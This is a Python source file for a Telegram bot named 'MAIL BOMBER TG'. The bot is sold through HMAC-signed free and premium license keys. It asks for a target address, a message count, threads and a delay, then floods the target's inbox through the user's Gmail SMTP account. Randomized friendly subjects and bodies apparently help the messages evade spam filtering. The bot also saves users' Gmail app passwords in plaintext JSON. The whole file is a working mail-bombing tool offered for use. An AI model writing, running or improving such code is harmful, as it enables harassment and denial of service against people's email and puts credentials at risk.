#!/usr/bin/env python3
"""
MAIL BOMBER TG — Telegram Bot by Shenru Tools
Uses Email Bomber secret and SHENRU-FREE/SHENRU-PREMIUM prefixes.
Device-bound premium: Telegram user ID as device ID.
Cloud-ready: BOT_TOKEN and SECRET_HEX via environment variables.
"""
import hmac
import hashlib
import base64
import json
import time
import os
import random
import struct
import smtplib
import telebot
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
# Same secret as Email Bomber (email_bomber.py)
SECRET_HEX = os.environ.get("SECRET_HEX", "f3a1c9b27e4d8a5f6b3c1d9e2f7a4b8c5d6e9f0a1b2c3d4e5f6a7b8c9d0e1f")
SECRET = bytes.fromhex(SECRET_HEX)

# ========== STORAGE ==========
DIR = os.path.expanduser("~/.tg_mail_bomber")
LICENSE_FILE = os.path.join(DIR, "licenses.json")
SMTP_FILE = os.path.join(DIR, "smtp_configs.json")

def ensure_dirs():
    os.makedirs(DIR, exist_ok=True)

def load_json(file):
    ensure_dirs()
    if os.path.exists(file):
        with open(file, 'r') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    ensure_dirs()
    with open(file, 'w') as f:
        json.dump(data, f, indent=2)

# ========== LICENSE ==========
def device_hash(uid):
    return hashlib.sha256(str(uid).encode()).digest()[:6]

def parse_license(key, tg_id):
    key = key.strip()
    if key.startswith("SHENRU-FREE-"):
        try:
            b64 = key[len("SHENRU-FREE-"):]
            padded = b64 + '=' * (-len(b64) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            if len(decoded) != 17:
                return {"valid": False, "reason": "invalid_format", "type": "free"}
            exp_bytes = decoded[:8]
            rand_bytes = decoded[8:11]
            mac_received = decoded[11:17]
            mac_expected = hmac.new(SECRET, exp_bytes + rand_bytes, hashlib.sha256).digest()[:6]
            if not hmac.compare_digest(mac_received, mac_expected):
                return {"valid": False, "reason": "bad_signature", "type": "free"}
            expires_at = struct.unpack('>Q', exp_bytes)[0]
            now = int(time.time())
            left = expires_at - now
            return {"valid": left > 0, "name": "Free User", "expires_at": expires_at,
                    "time_left": left if left > 0 else 0, "type": "free"}
        except Exception:
            return {"valid": False, "reason": "invalid_format", "type": "free"}

    if key.startswith("SHENRU-PREMIUM-"):
        try:
            b64 = key[len("SHENRU-PREMIUM-"):]
            padded = b64 + '=' * (-len(b64) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            if len(decoded) < 23:
                return {"valid": False, "reason": "invalid_format", "type": "premium"}
            exp_bytes = decoded[:8]
            remaining = decoded[8:]
            dev_hashes = []
            pos = 0
            while pos < len(remaining) - 9:
                dev_hashes.append(remaining[pos:pos+6])
                pos += 6
            rand_bytes = remaining[pos:pos+3]
            mac_received = remaining[pos+3:pos+9]
            mac_expected = hmac.new(SECRET, exp_bytes + b''.join(dev_hashes) + rand_bytes,
                                    hashlib.sha256).digest()[:6]
            if not hmac.compare_digest(mac_received, mac_expected):
                return {"valid": False, "reason": "bad_signature", "type": "premium"}
            current_dev = device_hash(tg_id)
            if current_dev not in dev_hashes:
                return {"valid": False, "reason": "device_mismatch", "type": "premium"}
            expires_at = struct.unpack('>Q', exp_bytes)[0]
            now = int(time.time())
            left = expires_at - now
            return {"valid": left > 0, "name": "premium", "expires_at": expires_at,
                    "time_left": left if left > 0 else 0, "type": "premium"}
        except Exception:
            return {"valid": False, "reason": "invalid_format", "type": "premium"}
    return {"valid": False, "reason": "invalid_format", "type": "unknown"}

# ========== BOT ==========
bot = telebot.TeleBot(BOT_TOKEN, threaded=True)

SUBJECTS = ["Quick question", "Hey, just checking in", "About earlier", "Something you might like", "Coffee?", "Random thought"]
BODIES = ["Hey, just wanted to see how you're doing.", "I saw something today that reminded me of you.", "Are you free this weekend? Let's catch up."]

def get_license_for_user(tg_id):
    return load_json(LICENSE_FILE).get(str(tg_id))

def save_license_for_user(tg_id, info):
    data = load_json(LICENSE_FILE)
    data[str(tg_id)] = info
    save_json(LICENSE_FILE, data)

def get_smtp_for_user(tg_id):
    return load_json(SMTP_FILE).get(str(tg_id))

def save_smtp_for_user(tg_id, config):
    data = load_json(SMTP_FILE)
    data[str(tg_id)] = config
    save_json(SMTP_FILE, data)

def send_email(provider, email, app_pass, target, subject, body):
    smtp_settings = {
        "gmail": ("smtp.gmail.com", 465),
        "yandex": ("smtp.yandex.com", 465),
        "outlook": ("smtp-mail.outlook.com", 587),
        "mailru": ("smtp.mail.ru", 465),
    }
    host, port = smtp_settings.get(provider, smtp_settings["gmail"])
    msg = MIMEMultipart()
    msg['From'] = formataddr(("Shenru Tools", email))
    msg['To'] = target
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    try:
        if port == 465:
            server = smtplib.SMTP_SSL(host, port, timeout=10)
        else:
            server = smtplib.SMTP(host, port, timeout=10)
            server.starttls()
        server.login(email, app_pass)
        server.sendmail(email, [target], msg.as_string())
        server.quit()
        return True
    except Exception:
        return False

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(message):
    tg_id = message.from_user.id
    lic = get_license_for_user(tg_id)
    if lic and lic.get('valid'):
        expiry = time.strftime('%Y-%m-%d %I:%M %p', time.localtime(lic['expires_at']))
        text = f"✅ Access granted!\n\nCustomer: {lic['name']}\nType: {lic['type']}\nExpires: {expiry}\n\nAvailable tools:\n1. Mail Bomber\n\nUse /bomb to start."
    else:
        text = "Welcome to MAIL BOMBER TG.\nYou need a license to use the tools.\n\nSend your Telegram ID to the developer, then use /license <key> to activate."
    bot.reply_to(message, text)

@bot.message_handler(commands=['license'])
def license_cmd(message):
    tg_id = message.from_user.id
    try:
        key = message.text.split(' ', 1)[1]
    except IndexError:
        bot.reply_to(message, "Usage: /license <key>")
        return
    info = parse_license(key, tg_id)
    if info['valid']:
        save_license_for_user(tg_id, info)
        bot.reply_to(message, "✅ License activated successfully.")
    else:
        bot.reply_to(message, f"❌ Invalid license: {info.get('reason')}")

@bot.message_handler(commands=['bomb'])
def bomb_cmd(message):
    tg_id = message.from_user.id
    lic = get_license_for_user(tg_id)
    if not lic or not lic.get('valid'):
        bot.reply_to(message, "No valid license. Use /license <key> to activate.")
        return
    smtp = get_smtp_for_user(tg_id)
    if not smtp:
        msg = bot.reply_to(message, "SMTP not configured. Send your Gmail address:")
        bot.register_next_step_handler(msg, process_smtp_email)
    else:
        msg = bot.reply_to(message, "Target email address:")
        bot.register_next_step_handler(msg, process_target)

def process_smtp_email(message):
    tg_id = message.from_user.id
    email = message.text.strip()
    smtp = get_smtp_for_user(tg_id) or {}
    smtp['email'] = email
    save_smtp_for_user(tg_id, smtp)
    msg = bot.reply_to(message, "Gmail App Password:")
    bot.register_next_step_handler(msg, process_smtp_pass)

def process_smtp_pass(message):
    tg_id = message.from_user.id
    app_pass = message.text.strip()
    smtp = get_smtp_for_user(tg_id)
    smtp['app_pass'] = app_pass
    smtp['provider'] = 'gmail'
    save_smtp_for_user(tg_id, smtp)
    msg = bot.reply_to(message, "SMTP saved. Now /bomb again.")
    bot.register_next_step_handler(msg, process_target)

def process_target(message):
    tg_id = message.from_user.id
    target = message.text.strip()
    smtp = get_smtp_for_user(tg_id)
    if not smtp:
        bot.reply_to(message, "SMTP not configured.")
        return
    msg = bot.reply_to(message, "Number of emails:")
    bot.register_next_step_handler(msg, lambda m: process_count(m, target, smtp))

def process_count(message, target, smtp):
    try:
        count = int(message.text)
    except:
        bot.reply_to(message, "Invalid number.")
        return
    msg = bot.reply_to(message, "Threads (1-10):")
    bot.register_next_step_handler(msg, lambda m: process_threads(m, target, smtp, count))

def process_threads(message, target, smtp, count):
    try:
        threads = int(message.text)
    except:
        threads = 3
    msg = bot.reply_to(message, "Delay seconds:")
    bot.register_next_step_handler(msg, lambda m: process_delay(m, target, smtp, count, threads))

def process_delay(message, target, smtp, count, threads):
    try:
        delay = float(message.text)
    except:
        delay = 1.0
    msg = bot.reply_to(message, "Subject (or 'random'):")
    bot.register_next_step_handler(msg, lambda m: process_subject(m, target, smtp, count, threads, delay))

def process_subject(message, target, smtp, count, threads, delay):
    subject = message.text.strip()
    msg = bot.reply_to(message, "Body (or 'random'):")
    bot.register_next_step_handler(msg, lambda m: process_body(m, target, smtp, count, threads, delay, subject))

def process_body(message, target, smtp, count, threads, delay, subject):
    body = message.text.strip()
    lic = get_license_for_user(message.from_user.id)
    if lic and lic.get('type') == 'free':
        count = min(count, 10)
        threads = 1
        delay = max(delay, 5.0)
    sent = 0
    failed = 0
    for i in range(count):
        s = random.choice(SUBJECTS) if subject == 'random' else subject
        b = random.choice(BODIES) if body == 'random' else body
        if send_email(smtp.get('provider','gmail'), smtp['email'], smtp['app_pass'], target, s, b):
            sent += 1
        else:
            failed += 1
        time.sleep(delay)
    bot.reply_to(message, f"✅ Done. Sent: {sent} | Failed: {failed}")

if __name__ == "__main__":
    ensure_dirs()
    bot.infinity_polling()